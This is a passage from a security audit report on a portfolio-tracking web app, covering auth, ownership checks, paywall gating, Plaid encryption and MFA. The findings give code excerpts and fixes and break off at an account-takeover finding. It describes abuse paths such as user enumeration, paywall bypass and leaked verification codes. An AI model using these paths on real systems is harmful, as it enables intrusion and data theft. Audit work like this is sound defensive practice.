**The Problem:** Any HTTP request with `x-capacitor: true` causes auth cookies to be set (auth.controller.ts line 55–74) and cleared (auth.middleware.ts line 10–18) with `sameSite: 'none'`. This header is trivially forgeable — it's not authenticated, signed, or validated against a known client fingerprint. A user who logs in from any client that sends this header (or a browser extension that injects it) gets cookies permanently stored with `sameSite: 'none'`.

`sameSite: 'none'` means the browser sends these cookies on ALL cross-site requests, including requests initiated by malicious third-party websites. While CORS (locked to specific origins + `credentials: true`) and JSON content-type (triggering preflight) provide layered defense, `sameSite` was designed as an independent CSRF protection layer. Downgrading it based on a client-controlled header removes that layer entirely.

**The Consequence:** If any CORS misconfiguration or new endpoint bypasses content-type validation, the `sameSite: 'none'` cookies become the entry point for CSRF. More immediately: any browser extension, proxy, or debugging tool that injects `x-capacitor: true` on a login request permanently weakens that user's cookie security.

**The Fix:** Instead of trusting a client header, detect Capacitor via the Origin (`capacitor://localhost` is already in `allowedOrigins`):
```typescript
function isCapacitorRequest(req: Request): boolean {
  const origin = req.headers.origin;
  return origin === 'capacitor://localhost';
}
```

---

### [Severity: Medium]

**Location:** `requireOwnership()`, lines 156–181 — Confused deputy via client-controlled fallback, and bypass when no userId provided

**The Problem:** Line 158 reads `resourceUserId` from three sources in priority order: `req.params[userIdParam] || req.query.userId || req.body?.userId`. If the route param is absent/empty, the middleware falls back to `req.query.userId` or `req.body?.userId` — both client-controlled. An attacker can set `?userId=their-own-id` to pass the ownership check while the controller reads a victim's ID from a different source (e.g., route param, or a different body field). Additionally, line 166 bypasses the check entirely when no userId is found: `if (!resourceUserId) { next(); return; }`.

**Mitigating factor:** This middleware is currently dead code — it's exported and tested but not wired into any production route. The vulnerability is latent.

**The Consequence:** If a developer wires `requireOwnership()` into a route expecting it to enforce access control, the fallback chain and bypass create a false sense of security. The middleware can be trivially bypassed.

**The Fix:** Remove the query/body fallback. Only check the named route param. If it's missing, fail closed:
```typescript
const resourceUserId = req.params[userIdParam];
if (!resourceUserId) {
  res.status(400).json({ error: 'Missing userId parameter' });
  return;
}
```

---

### [Severity: Low]

**Location:** `requireAuth()`, line 106 — Email verification uses strict `=== false`, allowing old tokens to bypass

**The Problem:** The check `req.user.emailVerified === false` only blocks users whose JWT explicitly contains `emailVerified: false`. Tokens from old sessions (before the email verification feature was added) have `emailVerified: undefined`, which fails the `=== false` check and passes through.

**The Consequence:** Users with old JWTs (minted before the email verification feature) can access verified-only endpoints until their token expires (15 min) and refreshes. The refresh would mint a new token with the correct `emailVerified` value. This is intentional per the code comment, but creates a 15-minute bypass window on each token refresh cycle for unverified users with stale tokens.

**The Fix:** When email verification is enabled and critical, use `!== true` instead of `=== false` to fail closed:
```typescript
if (config.emailVerificationEnabled && req.user && req.user.username !== '_system' && req.user.emailVerified !== true) {
```

---

## File 8: `src/services/creator.service.ts`

**Audited:** 2026-03-01
**Role:** Creator profiles, access level resolution, entitlement gating, locked content retrieval, discovery/search, payout balance, dashboard

---

### [Severity: High]

**Location:** `getLockedContent()`, lines 331–341 — `tradeHistory` section exposes deposit/withdrawal records, not stock trades

**The Problem:** The `tradeHistory` case (lines 332–340) queries `prisma.transaction.findMany`, which is the `Transaction` model — deposits and withdrawals. The `PortfolioTrade` model (buy/sell/split) is the correct source for trade history. The raw Prisma objects are returned unfiltered (line 340: `return tx;`), exposing the creator's internal `userId`, database `id`, deposit/withdrawal `amount`, `date`, and `type`.

**The Consequence:** Paid subscribers see the creator's personal cash flow — when they deposited $50,000, when they withdrew $10,000 — instead of their stock trades. This is highly sensitive financial data that no creator would consent to sharing. Additionally, internal fields (`userId`, record `id`) are leaked, which could be used for IDOR attacks on other endpoints.

**The Fix:** Query `PortfolioTrade` instead of `Transaction`, and filter the returned fields:
```typescript
case 'tradeHistory': {
  const trades = await prisma.portfolioTrade.findMany({
    where: {
      userId: creatorUserId,
      date: { lte: tradeDelayCutoff },
    },
    orderBy: { date: 'desc' },
    take: 200,
    select: { ticker: true, type: true, date: true, shares: hideShareCount ? false : true, price: true },
  });
  return trades;
}
```

---

### [Severity: Medium]

**Location:** `resolveAccessLevel()`, lines 84–91 — `currentPeriodEnd: null` grants unlimited paid access with no timeout

**The Problem:** Line 89 allows paid access when `currentPeriodEnd` is `null`. The comment explains this covers "a just-created Stripe subscription" where the `customer.subscription.updated` webhook hasn't arrived yet. But there's no timeout or expiration on this grace period. If the webhook permanently fails (Stripe outage, endpoint misconfiguration, server crash during processing), the subscription stays with `currentPeriodEnd: null` forever, granting unlimited paid access.

**The Consequence:** A subscriber could get permanent free access if the `customer.subscription.updated` webhook fails after checkout. They cancel their Stripe subscription (status changes to `canceled` via a different webhook), but `currentPeriodEnd` stays null, so the `{ currentPeriodEnd: null }` condition at line 89 keeps granting access indefinitely.

**The Fix:** Add a time-bound fallback: allow null `currentPeriodEnd` only for subscriptions created within the last 24 hours:
```typescript
{
  currentPeriodEnd: null,
  // Grace period: only allow null for recently created subscriptions
  createdAt: { gt: new Date(Date.now() - 24 * 60 * 60 * 1000) },
},
```

---

### [Severity: Medium]

**Location:** `discoverCreators()`, lines 684–687 — Loads ALL matching users into memory for sorting

**The Problem:** `prisma.user.findMany` (line 684) has no `take` limit — it loads every `profilePublic: true, leaderboardEligible: true` user into memory. These records include nested relations (`leaderboardCaches`, `creator` with `visibility`). In-memory sorting (lines 732–767) then processes the entire dataset.

**The Consequence:** As the user base grows to thousands or tens of thousands, this endpoint becomes a denial-of-service vector. A single unauthenticated request triggers a full table scan, loads all records with nested joins, and sorts them in memory. Concurrent requests multiply the memory footprint.

**The Fix:** Use database-level sorting and pagination with `orderBy` + `take` + cursor-based `skip`. For the `popular` sort, denormalize `subscriberCount` on the Creator model and index it.

---

### [Severity: Low]

**Location:** `decodeCursor()`, lines 595–601 — Parses untrusted Base64 JSON without schema validation

**The Problem:** The cursor is a user-controlled Base64-encoded JSON string. `JSON.parse` decodes it into an arbitrary object. While the only downstream usage (line 771: `entries.findIndex(e => e.userId === cursorData.u)`) is safe, the parsed object could have prototype pollution payloads or unexpected field types that affect future code additions.

**The Consequence:** No current exploit, but the pattern of trusting parsed JSON from client input without validation is a latent risk. Any future code that reads additional fields from `cursorData` inherits the trust assumption.

**The Fix:** Validate the parsed cursor against the expected shape:
```typescript
function decodeCursor(cursor: string): DiscoverCursorData | null {
  try {
    const data = JSON.parse(Buffer.from(cursor, 'base64url').toString());
    if (typeof data?.u !== 'string' || typeof data?.s !== 'string') return null;
    return data;
  } catch { return null; }
}
```

---

### [Severity: Low]

**Location:** `reportCreator()`, lines 504–529 — No rate limit or duplicate check on report submissions

**The Problem:** A user can submit unlimited reports against a creator. There's no check for existing reports from the same reporter, no rate limit, and no length validation on the `description` field (only `trim`). A malicious user could flood the reports table with thousands of entries.

**The Consequence:** Report spam could overwhelm admin review tools and, depending on any future auto-moderation (e.g., "suspend after N reports"), could be weaponized to get legitimate creators suspended.

**The Fix:** Add a duplicate check (`findFirst` for same reporter + creator + status: 'open'`) and cap the description length.

---

## File 9: `src/controllers/portfolio.controller.ts`

**Audited**: 2026-03-01
**Role**: Main controller for portfolio CRUD, chart data, CSV/screenshot import, confirm import, clear portfolio, performance, projections, pace, account history.
**Lines**: ~2285

### Finding 9.1 — HIGH: `confirmPortfolioImportHandler` accepts unbounded array sizes

**Severity**: HIGH
**Location**: `portfolio.controller.ts:1714-2131` — `confirmPortfolioImportHandler`

**The Problem:** The `holdings`, `trades`, and `ledgerEvents` arrays are destructured from `req.body` with a type assertion (`as { ... }`) but no schema validation and **no length cap**. The CSV parsing path enforces `MAX_ROWS = 2000` (line 1362), but the confirm endpoint — which actually writes to the database — has no such limit. An attacker can skip the parse step entirely and POST directly to the confirm endpoint with millions of trade/ledger records.

```typescript
// Line 1716 — no Zod schema, no array length validation
const { holdings, mode, trades, ledgerEvents, marginDebt } = req.body as {
  holdings?: any[];    // unbounded
  mode?: 'replace' | 'merge' | 'incremental';
  trades?: any[];      // unbounded — createMany inserts ALL
  ledgerEvents?: any[]; // unbounded
  marginDebt?: number;
};
```

**The Consequence:** Memory exhaustion from deserializing a multi-million element JSON array. Database bloat from `createMany` inserting unlimited records. A single authenticated request could insert 10M trade records, consuming gigabytes of storage and slowing all future queries for that user.

**The Fix:** Add Zod validation with `z.array(...).max(5000)` for each array field. Reject early before any DB queries.

### Finding 9.2 — MEDIUM: `setCashBalance` non-atomic double-write

**Severity**: MEDIUM
**Location**: `portfolio.controller.ts:226-251` — `setCashBalance`

**The Problem:** Cash balance is updated in two separate, non-transactional steps: first `prisma.userSettings.upsert()` (line 238), then `updateCashBalance()` from portfolio.service (line 245). If the second call fails (e.g., network error, constraint violation), the `userSettings` table shows the new balance while the portfolio service sees the old one.

```typescript
// Step 1 — userSettings updated
await prisma.userSettings.upsert({
  where: { userId: authUserId },
  update: { cashBalance },
  create: { userId: authUserId, cashBalance, marginDebt: 0 },
});

// Step 2 — portfolio service updated separately (can fail independently)
const settings = await updateCashBalance(req.user!.userId, cashBalance);
```

**The Consequence:** Divergent cash balance between `userSettings` and the portfolio service. Charts, TWR calculations, and net equity will use different values depending on which source they read from.

**The Fix:** Wrap both operations in a `prisma.$transaction()`, or consolidate to a single source of truth for cash balance.

### Finding 9.3 — MEDIUM: User ID enumeration via 404/403 divergence

**Severity**: MEDIUM
**Location**: `portfolio.controller.ts:54-66` (`getPortfolioHandler`), `649-664` (`getPerformanceHandler`), `341-343` (`getChartHandler`)

**The Problem:** Three public-profile endpoints accept a `userId` query parameter and return distinct HTTP status codes: 404 if the user doesn't exist, 403 if the user exists but their profile is private. This oracle allows an attacker to enumerate valid user UUIDs.

```typescript
// Line 59-66 — 404 vs 403 leaks user existence
if (!targetUser) {
  res.status(404).json({ error: 'User not found' });  // user doesn't exist
  return;
}
if (!targetUser.profilePublic) {
  res.status(403).json({ error: 'This profile is private' });  // user EXISTS, profile private
  return;
}
```

**The Consequence:** Attackers can confirm which UUIDs belong to real accounts. Combined with other vulnerabilities (e.g., the snapshot cross-user data leak from Finding 3.2), confirmed user IDs become more dangerous.

**The Fix:** Return identical responses for both cases: `res.status(404).json({ error: 'Not found' })` whether the user doesn't exist or their profile is private.

### Finding 9.4 — MEDIUM: `importMappedCsvHandler` parses `excludedRows` JSON twice with no error handling

**Severity**: MEDIUM
**Location**: `portfolio.controller.ts:1346-1348` and `1418-1419`

**The Problem:** `JSON.parse(req.body.excludedRows || '[]')` is called without a dedicated try-catch. If the user sends malformed JSON, the outer try-catch returns a generic 500 error instead of a proper 400. Additionally, the same field is parsed a second time at line 1418 inside the snapshot import branch — parsing user input twice violates DRY and creates divergent failure modes.

```typescript
// Line 1346 — first parse, no dedicated error handling
const excludedRows: Set<number> = new Set(
  JSON.parse(req.body.excludedRows || '[]')  // throws on malformed JSON → 500
);

// Line 1418 — parsed AGAIN in snapshot branch
const excludedRowSet = new Set(
  JSON.parse(req.body.excludedRows || '[]')  // duplicate parse
);
```

**The Consequence:** Malformed `excludedRows` returns 500 (server error) instead of 400 (client error), confusing error monitoring. The duplicate parse is unnecessary code that could diverge if one path is updated and the other isn't.

**The Fix:** Parse `excludedRows` once at the top of the function with a dedicated try-catch returning 400. Reuse the result in both code paths.

### Finding 9.5 — LOW: 1D chart 3% outlier smoothing fabricates data

**Severity**: LOW
**Location**: `portfolio.controller.ts:431-441`

**The Problem:** Any intraday chart point that deviates more than 3% from its neighbors is silently replaced with the neighbor average. While intended to suppress bad extended-hours quotes, this threshold also suppresses legitimate market events — a stock moving 3.1% within a 5-minute candle (e.g., earnings release, FDA approval) will be smoothed away.

```typescript
// Line 437 — 3% threshold alters legitimate data
if (neighborAvg > 0 && Math.abs(curr - neighborAvg) / neighborAvg > 0.03) {
  points[i].value = neighborAvg;  // real spike erased
}
```

**The Consequence:** Users see incorrect portfolio values during volatile market events. The chart silently shows fabricated data points without any indication. A user holding a volatile stock through earnings could see their chart show a smooth line when their portfolio actually spiked 5% and back.

**The Fix:** Increase threshold to 10-15% for intraday (real 5-min moves rarely exceed that), or flag smoothed points in the response so the UI can indicate interpolated data.

---

---

## File 10: `src/controllers/auth.controller.ts`

**Audited**: 2026-03-01
**Role**: Authentication controller — login, signup, logout, refresh, password set/change/reset, email verification, account deletion, username/password checks.
**Lines**: ~635

### Finding 10.1 — MEDIUM: `deleteAccountHandler` orphans HoldingSnapshot records

**Severity**: MEDIUM
**Location**: `auth.controller.ts:555-596` (delete transaction), `prisma/schema.prisma:307-320` (HoldingSnapshot model)

**The Problem:** `deleteAccountHandler` explicitly deletes `PortfolioSnapshot` records (line 577) but never deletes the child `HoldingSnapshot` records. Critically, `HoldingSnapshot` has **no Prisma relation** defined — it just has a bare `snapshotId: String` field with no `@relation` attribute and no foreign key constraint. This means:
1. Deleting PortfolioSnapshots succeeds (no FK to block it)
2. HoldingSnapshot records persist as orphans with dangling `snapshotId` references
3. These orphans accumulate forever — no cleanup path exists

```prisma
// schema.prisma — NO relation, NO FK, NO cascade
model HoldingSnapshot {
  id           String   @id @default(uuid())
  snapshotId   String   // bare string, not a relation
  ticker       String
  shares       Float
  price        Float
  marketValue  Float
  dayPL        Float
  dayPLPercent Float
  // ... no @relation, no onDelete
}
```

Compare with `clearPortfolioHandler` (line 2150) which correctly deletes HoldingSnapshots first.

**The Consequence:** After account deletion, the user's portfolio composition data (tickers, share counts, prices, P/L) remains in the database indefinitely. While not directly linkable to a user after parent records are deleted, this is a data retention issue that could violate GDPR "right to erasure" requirements.

**The Fix:** Add `await tx.holdingSnapshot.deleteMany({ where: { snapshotId: { in: snapshotIds } } })` before the PortfolioSnapshot deletion. Also add a proper `@relation` to HoldingSnapshot to enforce referential integrity with `onDelete: Cascade`.

### Finding 10.2 — MEDIUM: `hasPasswordHandler` — unauthenticated password-type oracle

**Severity**: MEDIUM
**Location**: `auth.controller.ts:215-230`

**The Problem:** `GET /auth/has-password/:username` is unauthenticated (uses `Request`, not `AuthRequest`) and reveals whether any username has a password set. The error handler defaults to returning `{ hasPassword: true }`, but the happy path leaks the actual state. Combined with `checkUsernameHandler`, an attacker can:
1. Enumerate valid usernames via `/auth/check-username/:username`
2. Determine auth type via `/auth/has-password/:username`
3. Target password-based accounts for credential stuffing, skip OAuth-only accounts

```typescript
// Line 224 — unauthenticated, returns real password state
const has = await hasPassword(username);
res.json({ hasPassword: has });
```

**The Consequence:** Attackers gain reconnaissance on every account's authentication method without any credentials. Accounts without passwords (potentially OAuth-only or initial setup) are identified as potentially softer targets.

**The Fix:** Require authentication, or always return `{ hasPassword: true }` regardless of actual state (the UI only needs this for the authenticated user's own account).

### Finding 10.3 — MEDIUM: `testGetVerificationCodeHandler` defaults open when `TEST_HELPER_KEY` is unset

**Severity**: MEDIUM
**Location**: `auth.controller.ts:431-458`

**The Problem:** This endpoint returns real email verification codes. It's gated on `NODE_ENV !== 'production'`, which is good. But when `TEST_HELPER_KEY` is not set in the environment, the auth check is effectively skipped:

```typescript
const configuredKey = process.env.TEST_HELPER_KEY;  // undefined if not set
const providedKey = req.headers['x-test-helper-key'];
const provided = Array.isArray(providedKey) ? providedKey[0] : providedKey;
if (configuredKey && provided !== configuredKey) {
  // Only enters if configuredKey is TRUTHY — skipped when undefined
  res.status(403).json({ error: 'Forbidden' });
  return;
}
// Proceeds to return verification code to anyone
```

**The Consequence:** Any publicly-accessible non-production environment (staging, preview deploys, dev servers) that doesn't explicitly set `TEST_HELPER_KEY` exposes verification codes to anyone. An attacker could sign up, then immediately retrieve the verification code via this endpoint, bypassing email verification entirely. This enables account creation without valid email ownership.

**The Fix:** Invert the guard: require `TEST_HELPER_KEY` to be explicitly set. If unset, deny access by default:
```typescript
if (!configuredKey || provided !== configuredKey) {
  res.status(403).json({ error: 'Forbidden' });
  return;
}
```

### Finding 10.4 — LOW: `signupHandler` — email enumeration via distinct 409 error

**Severity**: LOW
**Location**: `auth.controller.ts:251-254`

**The Problem:** Signup returns `409 "Email is already in use"` when the email is taken. This directly confirms whether an email address is registered in the system. While this is a common UX pattern, it enables email harvesting at scale.

**The Consequence:** An attacker can enumerate which email addresses are registered by attempting signups. This is a prerequisite for targeted phishing or credential stuffing from breach databases.

**The Fix:** Return a generic error or always proceed to the next step (email verification), deferring the duplicate check to the verification email which would contain "you already have an account" language.

### Finding 10.5 — LOW: `refreshHandler` accepts refresh token from request body

**Severity**: LOW
**Location**: `auth.controller.ts:611`

**The Problem:** The refresh endpoint accepts the token from either cookies or the request body: `req.cookies?.refreshToken || req.body?.refreshToken`. While httpOnly cookies prevent XSS from reading cookies, accepting the token from the body means any code path that can construct a POST request can submit a stolen token. This primarily widens the attack surface for mobile/Capacitor flows where cookies may not be available.

```typescript
// Line 611 — fallback to body allows non-cookie submission
const token = req.cookies?.refreshToken || req.body?.refreshToken;
```

**The Consequence:** If a refresh token is leaked (e.g., via server logs, API response body, or a compromised transport layer), it can be replayed via a simple POST request without needing to set cookies.

**The Fix:** If the body fallback is only for Capacitor, gate it behind the `isCapacitorRequest` check. For browser clients, only accept from cookies.

---

---

## File 11: `src/controllers/users.controller.ts`

**Audited**: 2026-03-01
**Role**: Public profile endpoints — user lookup, portfolio viewing with visibility filtering, chart data for other users, holdings visibility settings.
**Lines**: ~367

### Finding 11.1 — MEDIUM: `getUserChartHandler` bypasses chart period paywall

**Severity**: MEDIUM
**Location**: `users.controller.ts:209-365` (handler), `routes/users.routes.ts:27` (route)

**The Problem:** `getChartHandler` in `portfolio.controller.ts` (line 333-338) enforces plan-based gating — free users can only view 1D, 1W, and YTD chart periods. When a `userId` query param is provided, it delegates to `getUserChartHandler` AFTER the plan check. However, `getUserChartHandler` is also directly accessible via `GET /users/:userId/chart` (registered with `optionalAuth` at `users.routes.ts:27`) with **no plan check at all**.

```typescript
// users.routes.ts:27 — direct access, no plan middleware
router.get('/:userId/chart', optionalAuth, getUserChartHandler);

// portfolio.controller.ts:333-338 — plan check only on THIS path
const plan = req.user?.plan ?? 'free';
const isProOrHigher = plan === 'pro' || plan === 'premium';
if (!isProOrHigher && !FREE_CHART_PERIODS.has(period)) {
  res.status(403).json({ error: 'upgrade_required', requiredPlan: 'pro' });
  return;
}
// THEN delegates to getUserChartHandler
```

**The Consequence:** Any unauthenticated or free-tier user can access 1M, 3M, 1Y, and ALL chart periods for any public profile by calling `/users/:userId/chart?period=1Y` directly, bypassing the premium paywall.

**The Fix:** Add the same `FREE_CHART_PERIODS` plan check inside `getUserChartHandler` itself, or apply a `requirePlan('pro')` middleware to the route for non-free periods.

### Finding 11.2 — MEDIUM: `getUserPortfolioHandler` 'sectors' visibility leaks `currentValue` and other fields

**Severity**: MEDIUM
**Location**: `users.controller.ts:159-173`

**The Problem:** When `holdingsVisibility` is set to `'sectors'`, the handler uses a spread operator (`...h`) to copy all holding fields, then zeros out specific fields. But `currentValue` (confirmed as `shares * currentPrice` in `user-portfolio.service.ts:75,109`) is NOT in the zeroed list. The intent is "Show only sector names, zero out individual holding details" — but `currentValue` reveals the exact dollar amount of each position.

```typescript
// Line 159 — 'sectors' mode leaks currentValue
} else if (vis === 'sectors') {
  portfolio.holdings = portfolio.holdings.map(h => ({
    ...h,               // currentValue, ticker, name, logo all pass through
    shares: 0,          // zeroed
    averageCost: 0,     // zeroed
    totalCost: 0,       // zeroed
    currentPrice: 0,    // zeroed
    previousClose: 0,   // zeroed
    pl: 0,              // zeroed
    plPercent: 0,       // zeroed
    dayChange: 0,       // zeroed
    dayChangePercent: 0,// zeroed
    // currentValue: NOT zeroed — leaks position size
  }));
}
```

**The Consequence:** A viewer sees `shares: 0, currentPrice: 0` but `currentValue: 54320` — revealing the exact dollar amount in each holding. This directly contradicts the user's privacy setting. An attacker viewing a public profile set to 'sectors' mode can determine the exact allocation and position sizes.

**The Fix:** Add `currentValue: 0` to the zeroed fields list. Also consider an allowlist approach (explicitly listing returned fields) instead of a blocklist/spread to prevent future field additions from leaking.

### Finding 11.3 — MEDIUM: `getUsersHandler` loads all public users with no pagination

**Severity**: MEDIUM
**Location**: `users.controller.ts:48-64`

**The Problem:** `GET /users` calls `prisma.user.findMany()` with no `take` limit or cursor pagination. It returns ALL public-profile users in a single response. As the user base grows, this becomes both a performance and abuse vector.

```typescript
// Line 50 — no limit, no pagination
const users = await prisma.user.findMany({
  where: { profilePublic: true },
  orderBy: { createdAt: 'asc' },
  select: { id: true, displayName: true, createdAt: true },
});
```

**The Consequence:** With 100K+ users, this response becomes multi-megabyte, consuming server memory and bandwidth. An attacker can repeatedly hit this endpoint to exhaust resources. Additionally, it exposes every public user's `id` and `displayName` in a single request — efficient for mass enumeration.

**The Fix:** Add pagination with `take: 50` and cursor-based pagination. Alternatively, if this is only used for the leaderboard, use a dedicated leaderboard endpoint with a fixed limit.

---

---

## File 12: `src/app.ts` + `src/middleware/rateLimiter.ts`

**Audited**: 2026-03-01
**Role**: Express app setup (CORS, Helmet/CSP, body parsing, proxy trust, SPA fallback) and all rate limiter definitions (14 limiters for login, signup, mutations, billing, webhooks, MFA, enumeration, global API).
**Lines**: ~199 (app.ts) + ~176 (rateLimiter.ts)

### Finding 12.1 — MEDIUM: Global `apiLimiter` skips ALL GET requests

**Severity**: MEDIUM
**Location**: `rateLimiter.ts:162-175`

**The Problem:** The global rate limiter explicitly skips every GET request via a `skip` callback. The assumption is "GET requests are read-only; mutations are protected by mutationLimiter." However, not every GET endpoint has a route-specific limiter. Any GET route without its own limiter is completely unprotected against abuse.

```typescript
// rateLimiter.ts:168-173 — global limiter skips ALL GETs
skip: (req) => {
  if (req.path === '/health') return true;
  if (req.method === 'GET') return true;  // every GET bypasses
  return false;
},
```

Known unprotected GET endpoints include:
- `GET /users` — loads ALL public users, no pagination (Finding 11.3)
- `GET /users/:userId/portfolio` — expensive DB queries + snapshot creation
- `GET /users/:userId/chart` — expensive chart reconstruction
- `GET /auth/has-password/:username` — enumeration oracle (Finding 10.2)

**The Consequence:** An attacker can send unlimited GET requests to expensive endpoints, causing CPU/memory exhaustion or harvesting user data. The `heavyReadLimiter` and `enumerationLimiter` only protect routes where they're explicitly applied — everything else is open.

**The Fix:** Remove the GET skip from the global limiter, or apply `heavyReadLimiter` as a default for all GET routes. Better: remove the `skip` callback entirely and let the 600/min global limit apply to all methods.

### Finding 12.2 — MEDIUM: Privacy policy claims complete deletion — contradicts Finding 10.1

**Severity**: MEDIUM (Compliance)
**Location**: `app.ts:146` (inline privacy policy HTML)

**The Problem:** The privacy policy states: *"Upon account deletion, all your data is permanently and immediately removed — there is no soft delete or recovery period."* This directly contradicts Finding 10.1: `HoldingSnapshot` records (containing ticker, shares, price, marketValue, dayPL data) are orphaned after account deletion because the model has no Prisma relation or cascade delete.

```html
<!-- Line 146 — inaccurate claim -->
<p>Your data is retained as long as your account is active.
Upon account deletion, all your data is permanently and immediately removed
— there is no soft delete or recovery period.</p>
```

**The Consequence:** Under GDPR (and CCPA), making false representations about data deletion is a compliance violation. If a user requests deletion and portfolio composition data remains in the database, the company has not fulfilled its legal obligation. This amplifies Finding 10.1 from a technical bug to a regulatory risk.

**The Fix:** Fix the underlying deletion bug (Finding 10.1), then the policy becomes accurate. Additionally, consider auditing all models with userId or snapshotId references to ensure complete cascade coverage.

### Finding 12.3 — LOW: CSP allows `'unsafe-inline'` for scripts

**Severity**: LOW
**Location**: `app.ts:41`

**The Problem:** The Content Security Policy includes `'unsafe-inline'` in `scriptSrc`. This allows any inline `<script>` tags to execute, which significantly weakens XSS protection. If an attacker achieves HTML injection anywhere (e.g., via a reflected parameter in an error message), they can execute arbitrary JavaScript.

```typescript
scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.plaid.com", ...],
```

**The Consequence:** CSP is the last line of defense against XSS. With `'unsafe-inline'` permitted, XSS payloads in `<script>` tags will execute regardless of other protections.

**The Fix:** Replace `'unsafe-inline'` with nonce-based CSP (`'nonce-{random}'`) or hash-based CSP for specific inline scripts. If Plaid Link requires inline scripts, scope the exception to Plaid-specific pages only.

### Finding 12.4 — LOW: SPA fallback returns HTML for unmatched API paths

**Severity**: LOW
**Location**: `app.ts:179-181`

**The Problem:** The catch-all `app.get('*')` handler serves `index.html` for any GET request not matched by API routes. This means requests to invalid API paths (e.g., `GET /nonexistent-endpoint`) return 200 with HTML content instead of a JSON 404 error.

```typescript
// Line 179 — returns HTML for ALL unmatched GETs
app.get('*', (req, res) => {
  res.sendFile(path.join(clientDir, 'index.html'));
});
```

**The Consequence:** API clients and monitoring tools that expect JSON responses receive HTML, potentially masking errors. Uptime monitors may report endpoints as healthy (200) when they're actually undefined. Additionally, the SPA's HTML bundle (which may contain inline scripts, API base URLs, or build metadata) is served for any path, which could leak implementation details.

**The Fix:** Add an API-specific 404 handler before the SPA fallback: `app.use('/api', (req, res) => res.status(404).json({ error: 'Not found' }))`. Or prefix all API routes under `/api/` and only apply the SPA fallback to non-API paths.

---

---

## File 13: `src/services/plaid.service.ts` + `src/controllers/plaid.controller.ts` + `src/utils/encryption.ts` + `src/utils/plaid-webhook-verify.ts`

**Audited**: 2026-03-01
**Role**: Plaid integration — Link token creation, access token exchange/encryption/storage, investment holdings fetch, item disconnect/revocation, webhook handling with JWT+SHA256 verification, AES-256-GCM encryption utility.
**Lines**: ~288 (plaid.service) + ~161 (plaid.controller) + ~39 (encryption) + ~113 (webhook-verify)

### Finding 13.1 — MEDIUM: Single encryption key shared between MFA secrets and Plaid access tokens

**Severity**: MEDIUM
**Location**: `encryption.ts:8` (key source), `config/index.ts:85` (env var)

**The Problem:** The `encrypt()`/`decrypt()` functions use `config.mfaEncryptionKey` (from `MFA_ENCRYPTION_KEY` env var) as the sole AES-256-GCM key for ALL encrypted data — both MFA TOTP secrets and Plaid access tokens. A single key compromise exposes both systems simultaneously.

```typescript
// encryption.ts:8 — one key for everything
function getKey(): Buffer {
  const key = config.mfaEncryptionKey;  // same key encrypts Plaid tokens AND MFA secrets
  return Buffer.from(key, 'hex');
}

// Used by MFA service for TOTP secrets:
const encryptedSecret = encrypt(totpSecret);
// AND by Plaid service for access tokens:
const accessTokenEnc = encrypt(access_token);
```

**The Consequence:** If the MFA encryption key is leaked (e.g., via env var dump, backup exposure, or a developer with access), an attacker can decrypt ALL Plaid access tokens in the database — gaining full access to every user's brokerage account. The key name `MFA_ENCRYPTION_KEY` is misleading, making it more likely that someone with access to MFA-related operations doesn't realize they also hold the keys to financial account access.

**The Fix:** Use separate encryption keys: `MFA_ENCRYPTION_KEY` for MFA secrets, `PLAID_ENCRYPTION_KEY` for Plaid access tokens. Each key should be independently generated, stored, and rotated.

### Finding 13.2 — MEDIUM: No key rotation support in encryption format

**Severity**: MEDIUM
**Location**: `encryption.ts:15-21` (encrypt), `encryption.ts:23-38` (decrypt)

**The Problem:** The ciphertext format is `iv:ciphertext:tag` with no key version identifier. If the encryption key needs to be rotated (e.g., after suspected compromise, employee departure, or regulatory requirement), there's no way to distinguish which records were encrypted with which key version.

```typescript
// encrypt output format — no key version
return `${iv.toString('hex')}:${encrypted.toString('hex')}:${tag.toString('hex')}`;
// v1:iv:ciphertext:tag would allow key rotation
```

**The Consequence:** Key rotation requires decrypting and re-encrypting ALL records atomically with downtime, or a risky two-phase migration. Without versioning, partial migration states are undetectable — some records may silently fail to decrypt after rotation. For a financial application handling brokerage access tokens, key rotation capability is a compliance expectation.

**The Fix:** Prepend a key version to the ciphertext format: `v1:iv:ciphertext:tag`. On decrypt, check the version to select the correct key. This enables rolling key rotation with zero downtime.

### Finding 13.3 — LOW: `disconnectPlaidItem` update not filtered by userId

**Severity**: LOW
**Location**: `plaid.service.ts:192-195`

**The Problem:** The `disconnectPlaidItem` function first verifies ownership via `findFirst({ where: { id: plaidItemId, userId } })`, then updates via `update({ where: { id: plaidItemId } })` — without `userId` in the update filter. While currently safe (the id was verified in the prior step), this pattern is fragile. If the code is refactored and the ownership check is removed or moved, the update becomes an IDOR.

```typescript
// Line 175 — ownership verified here
const item = await prisma.plaidItem.findFirst({
  where: { id: plaidItemId, userId },  // userId checked ✓
});
// ...
// Line 192 — but NOT here
await prisma.plaidItem.update({
  where: { id: plaidItemId },  // userId NOT checked — relies on prior findFirst
  data: { status: 'revoked' },
});
```

**The Consequence:** A defense-in-depth gap. If a future refactor removes or weakens the findFirst check, the update would revoke any user's Plaid item. Given that this controls brokerage account access, the blast radius of a regression here is high.

**The Fix:** Use a compound where: `where: { id: plaidItemId, userId }` on the update, or use `updateMany` with both filters and check the count.

### Finding 13.4 — LOW: Webhook verification disabled based on env string comparison

**Severity**: LOW
**Location**: `plaid.controller.ts:127`

**The Problem:** Webhook JWT verification is skipped when `config.plaidEnv !== 'sandbox'` evaluates to false. If `PLAID_ENV` is misconfigured (e.g., left as `'sandbox'` in a production deployment, or set to an empty string that happens to match), all webhook calls are accepted without signature verification.

```typescript
// Line 127 — verification gate
if (config.plaidEnv !== 'sandbox') {
  // verify JWT + body hash
}
// If plaidEnv IS 'sandbox' (even accidentally in prod), verification is skipped
```

**The Consequence:** An attacker who can reach the webhook endpoint (`POST /plaid/webhook`) can send arbitrary payloads to change any Plaid item's status (error, suspended) without authentication. This could disconnect users from their brokerage accounts.

**The Fix:** In production, require verification regardless of `plaidEnv`. Add a guard: `if (config.nodeEnv === 'production' || config.plaidEnv !== 'sandbox')`.

---

---

## File 14: `src/services/mfa.service.ts` + `src/controllers/mfa.controller.ts`

**Audited**: 2026-03-01
**Role**: Multi-factor authentication — TOTP setup/verify, email OTP, backup codes, MFA challenge lifecycle, email update with verification.
**Lines**: ~447 (mfa.service) + ~344 (mfa.controller)

### Finding 14.1 — HIGH: `updateEmail` requires no password verification — enables account takeover

**Severity**: HIGH
**Location**: `mfa.controller.ts:208-226` (`updateEmailHandler`), `mfa.service.ts:236-265` (`updateEmail`)

